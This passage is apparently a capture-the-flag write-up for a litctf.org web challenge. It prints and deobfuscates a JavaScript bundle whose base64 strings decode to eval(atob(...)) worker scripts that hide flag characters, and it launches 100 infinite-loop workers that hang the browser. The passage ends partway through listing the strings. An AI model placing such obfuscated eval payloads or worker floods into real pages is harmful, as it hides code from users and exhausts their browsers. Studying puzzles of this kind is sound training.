└─$ curl https://litctf.org:31782/
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Vite + TS</title>
    <script type="module" crossorigin src="/assets/index-DLdRi53f.js"></script>
  </head>
  <body>
    <div id="app"></div>
  </body>
</html>
```

You see, there is a JavaScript file in the assets directory. Bring that down.

```bash
└─$ cat index-DLdRi53f.js
(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const d of document.querySelectorAll('link[rel="modulepreload"]'))a(d);new MutationObserver(d=>{for(const w of d)if(w.type==="childList")for(const c of w.addedNodes)c.tagName==="LINK"&&c.rel==="modulepreload"&&a(c)}).observe(document,{childList:!0,subtree:!0});function t(d){const w={};return d.integrity&&(w.integrity=d.integrity),d.referrerPolicy&&(w.referrerPolicy=d.referrerPolicy),d.crossOrigin==="use-credentials"?w.credentials="include":d.crossOrigin==="anonymous"?w.credentials="omit":w.credentials="same-origin",w}function a(d){if(d.ep)return;d.ep=!0;const w=t(d);fetch(d.href,w)}})();const y="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZE1KeWs3IikpfSkoKTsK",C=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),o=typeof window<"u"&&window.Blob&&new Blob([C(y)],{type:"text/javascript;charset=utf-8"});function Q(r){let e;try{if(e=o&&(window.URL||window.webkitURL).createObjectURL(o),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+y,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const Z="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEpKeWs3IikpfSkoKTsK",x=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),i=typeof window<"u"&&window.Blob&&new Blob([x(Z)],{type:"text/javascript;charset=utf-8"});function F(r){let e;try{if(e=i&&(window.URL||window.webkitURL).createObjectURL(i),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+Z,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const v="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZFVKeWs3IikpfSkoKTsK",A=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),b=typeof window<"u"&&window.Blob&&new Blob([A(v)],{type:"text/javascript;charset=utf-8"});function I(r){let e;try{if(e=b&&(window.URL||window.webkitURL).createObjectURL(b),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+v,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const j="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZERKeWs3IikpfSkoKTsK",p=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),k=typeof window<"u"&&window.Blob&&new Blob([p(j)],{type:"text/javascript;charset=utf-8"});function G(r){let e;try{if(e=k&&(window.URL||window.webkitURL).createObjectURL(k),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+j,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const J="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZFVKeWs3IikpfSkoKTsK",T=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),W=typeof window<"u"&&window.Blob&&new Blob([T(J)],{type:"text/javascript;charset=utf-8"});function g(r){let e;try{if(e=W&&(window.URL||window.webkitURL).createObjectURL(W),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+J,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const Y="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEdKeWs3IikpfSkoKTsK",N=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),L=typeof window<"u"&&window.Blob&&new Blob([N(Y)],{type:"text/javascript;charset=utf-8"});function M(r){let e;try{if(e=L&&(window.URL||window.webkitURL).createObjectURL(L),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+Y,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const h="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDdKeWs3IikpfSkoKTsK",X=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),R=typeof window<"u"&&window.Blob&&new Blob([X(h)],{type:"text/javascript;charset=utf-8"});function P(r){let e;try{if(e=R&&(window.URL||window.webkitURL).createObjectURL(R),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+h,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const O="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZHJKeWs3IikpfSkoKTsK",q=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),U=typeof window<"u"&&window.Blob&&new Blob([q(O)],{type:"text/javascript;charset=utf-8"});function _(r){let e;try{if(e=U&&(window.URL||window.webkitURL).createObjectURL(U),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+O,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const E="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDY3pKeWs3IikpfSkoKTsK",ee=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),l=typeof window<"u"&&window.Blob&&new Blob([ee(E)],{type:"text/javascript;charset=utf-8"});function re(r){let e;try{if(e=l&&(window.URL||window.webkitURL).createObjectURL(l),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+E,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const B="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEdKeWs3IikpfSkoKTsK",te=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),f=typeof window<"u"&&window.Blob&&new Blob([te(B)],{type:"text/javascript;charset=utf-8"});function de(r){let e;try{if(e=f&&(window.URL||window.webkitURL).createObjectURL(f),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+B,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const H="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDYzNKeWs3IikpfSkoKTsK",ne=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),s=typeof window<"u"&&window.Blob&&new Blob([ne(H)],{type:"text/javascript;charset=utf-8"});function we(r){let e;try{if(e=s&&(window.URL||window.webkitURL).createObjectURL(s),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+H,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const $="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDZKeWs3IikpfSkoKTsK",ae=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),u=typeof window<"u"&&window.Blob&&new Blob([ae($)],{type:"text/javascript;charset=utf-8"});function ce(r){let e;try{if(e=u&&(window.URL||window.webkitURL).createObjectURL(u),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+$,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const z="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZElKeWs3IikpfSkoKTsK",oe=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),m=typeof window<"u"&&window.Blob&&new Blob([oe(z)],{type:"text/javascript;charset=utf-8"});function ie(r){let e;try{if(e=m&&(window.URL||window.webkitURL).createObjectURL(m),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+z,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const S="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDlKeWs3IikpfSkoKTsK",be=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),V=typeof window<"u"&&window.Blob&&new Blob([be(S)],{type:"text/javascript;charset=utf-8"});function ke(r){let e;try{if(e=V&&(window.URL||window.webkitURL).createObjectURL(V),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+S,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const D="KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2Zvcig7Oyljb25zb2xlLmxvZygia2FibGV3eSIpfSkoKTsK",We=r=>Uint8Array.from(atob(r),e=>e.charCodeAt(0)),K=typeof window<"u"&&window.Blob&&new Blob([We(D)],{type:"text/javascript;charset=utf-8"});function Le(r){let e;try{if(e=K&&(window.URL||window.webkitURL).createObjectURL(K),!e)throw"";const t=new Worker(e,{name:r==null?void 0:r.name});return t.addEventListener("error",()=>{(window.URL||window.webkitURL).revokeObjectURL(e)}),t}catch{return new Worker("data:text/javascript;base64,"+D,{name:r==null?void 0:r.name})}finally{e&&(window.URL||window.webkitURL).revokeObjectURL(e)}}const n=[];n.push(Q);n.push(F);n.push(I);n.push(G);n.push(g);n.push(M);n.push(P);n.push(_);n.push(re);n.push(de);n.push(we);n.push(ce);n.push(ie);n.push(ke);for(let r=0;r<100;r++)new Le;let Re="";(async()=>{for(const r of n){const e=new r;Re+=await new Promise(t=>{e.onmessage=a=>{t(a.data)}}),e.terminate()}})();
```

It’s an obfuscated JavaScript code. Go to an online JavaScript deobfuscator. I used

[JavaScript Deobfuscator](https://deobfuscate.io/)

```bash
(function () {
  const e = document.createElement("link").relList;
  if (e && e.supports && e.supports("modulepreload")) return;
  for (const d of document.querySelectorAll('link[rel="modulepreload"]')) a(d);
  new MutationObserver(d => {
    for (const w of d) if (w.type === "childList") for (const c of w.addedNodes) c.tagName === "LINK" && c.rel === "modulepreload" && a(c);
  }).observe(document, {childList: true, subtree: true});
  function t(d) {
    const w = {};
    return d.integrity && (w.integrity = d.integrity), d.referrerPolicy && (w.referrerPolicy = d.referrerPolicy), d.crossOrigin === "use-credentials" ? w.credentials = "include" : d.crossOrigin === "anonymous" ? w.credentials = "omit" : w.credentials = "same-origin", w;
  }
  function a(d) {
    if (d.ep) return;
    d.ep = true;
    const w = t(d);
    fetch(d.href, w);
  }
}());
const y = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZE1KeWs3IikpfSkoKTsK", C = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), o = typeof window < "u" && window.Blob && new Blob([C(y)], {type: "text/javascript;charset=utf-8"});
function Q(r) {
  let e;
  try {
    if (e = o && (window.URL || window.webkitURL).createObjectURL(o), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + y, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const Z = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEpKeWs3IikpfSkoKTsK", x = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), i = typeof window < "u" && window.Blob && new Blob([x(Z)], {type: "text/javascript;charset=utf-8"});
function F(r) {
  let e;
  try {
    if (e = i && (window.URL || window.webkitURL).createObjectURL(i), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + Z, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const v = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZFVKeWs3IikpfSkoKTsK", A = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), b = typeof window < "u" && window.Blob && new Blob([A(v)], {type: "text/javascript;charset=utf-8"});
function I(r) {
  let e;
  try {
    if (e = b && (window.URL || window.webkitURL).createObjectURL(b), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + v, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const j = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZERKeWs3IikpfSkoKTsK", p = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), k = typeof window < "u" && window.Blob && new Blob([p(j)], {type: "text/javascript;charset=utf-8"});
function G(r) {
  let e;
  try {
    if (e = k && (window.URL || window.webkitURL).createObjectURL(k), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + j, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const J = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZFVKeWs3IikpfSkoKTsK", T = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), W = typeof window < "u" && window.Blob && new Blob([T(J)], {type: "text/javascript;charset=utf-8"});
function g(r) {
  let e;
  try {
    if (e = W && (window.URL || window.webkitURL).createObjectURL(W), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + J, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const Y = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEdKeWs3IikpfSkoKTsK", N = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), L = typeof window < "u" && window.Blob && new Blob([N(Y)], {type: "text/javascript;charset=utf-8"});
function M(r) {
  let e;
  try {
    if (e = L && (window.URL || window.webkitURL).createObjectURL(L), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + Y, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const h = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDdKeWs3IikpfSkoKTsK", X = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), R = typeof window < "u" && window.Blob && new Blob([X(h)], {type: "text/javascript;charset=utf-8"});
function P(r) {
  let e;
  try {
    if (e = R && (window.URL || window.webkitURL).createObjectURL(R), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + h, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const O = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZHJKeWs3IikpfSkoKTsK", q = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), U = typeof window < "u" && window.Blob && new Blob([q(O)], {type: "text/javascript;charset=utf-8"});
function _(r) {
  let e;
  try {
    if (e = U && (window.URL || window.webkitURL).createObjectURL(U), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + O, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const E = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDY3pKeWs3IikpfSkoKTsK", ee = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), l = typeof window < "u" && window.Blob && new Blob([ee(E)], {type: "text/javascript;charset=utf-8"});
function re(r) {
  let e;
  try {
    if (e = l && (window.URL || window.webkitURL).createObjectURL(l), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + E, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const B = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEdKeWs3IikpfSkoKTsK", te = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), f = typeof window < "u" && window.Blob && new Blob([te(B)], {type: "text/javascript;charset=utf-8"});
function de(r) {
  let e;
  try {
    if (e = f && (window.URL || window.webkitURL).createObjectURL(f), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + B, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const H = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDYzNKeWs3IikpfSkoKTsK", ne = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), s = typeof window < "u" && window.Blob && new Blob([ne(H)], {type: "text/javascript;charset=utf-8"});
function we(r) {
  let e;
  try {
    if (e = s && (window.URL || window.webkitURL).createObjectURL(s), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + H, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const $ = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDZKeWs3IikpfSkoKTsK", ae = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), u = typeof window < "u" && window.Blob && new Blob([ae($)], {type: "text/javascript;charset=utf-8"});
function ce(r) {
  let e;
  try {
    if (e = u && (window.URL || window.webkitURL).createObjectURL(u), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + $, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const z = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZElKeWs3IikpfSkoKTsK", oe = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), m = typeof window < "u" && window.Blob && new Blob([oe(z)], {type: "text/javascript;charset=utf-8"});
function ie(r) {
  let e;
  try {
    if (e = m && (window.URL || window.webkitURL).createObjectURL(m), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + z, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const S = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZDlKeWs3IikpfSkoKTsK", be = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), V = typeof window < "u" && window.Blob && new Blob([be(S)], {type: "text/javascript;charset=utf-8"});
function ke(r) {
  let e;
  try {
    if (e = V && (window.URL || window.webkitURL).createObjectURL(V), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + S, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const D = "KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2Zvcig7Oyljb25zb2xlLmxvZygia2FibGV3eSIpfSkoKTsK", We = r => Uint8Array.from(atob(r), e => e.charCodeAt(0)), K = typeof window < "u" && window.Blob && new Blob([We(D)], {type: "text/javascript;charset=utf-8"});
function Le(r) {
  let e;
  try {
    if (e = K && (window.URL || window.webkitURL).createObjectURL(K), !e) throw "";
    const t = new Worker(e, {name: r == null ? undefined : r.name});
    return t.addEventListener("error", () => {
      (window.URL || window.webkitURL).revokeObjectURL(e);
    }), t;
  } catch {
    return new Worker("data:text/javascript;base64," + D, {name: r == null ? undefined : r.name});
  } finally {
    e && (window.URL || window.webkitURL).revokeObjectURL(e);
  }
}
const n = [];
n.push(Q);
n.push(F);
n.push(I);
n.push(G);
n.push(g);
n.push(M);
n.push(P);
n.push(_);
n.push(re);
n.push(de);
n.push(we);
n.push(ce);
n.push(ie);
n.push(ke);
for (let r = 0; r < 100; r++) new Le;
let Re = "";
(async () => {
  for (const r of n) {
    const e = new r;
    Re += await new Promise(t => {
      e.onmessage = a => {
        t(a.data);
      };
    }), e.terminate();
  }
})();
```

We see this huge code, but the interesting things are the `base64` strings in between. Let’s collect them.

```
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZE1KeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZEpKeWs3IikpfSkoKTsK
KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO2V2YWwoYXRvYigiZDJocGJHVWdLSFJ5ZFdVcElHTnZibk52YkdVdWJHOW5LQ2RyWVdKc1pYZDVKeWs3Q25CdmMzUk5aWE56WVdkbEtDZFVKeWs3IikpfSkoKTsK
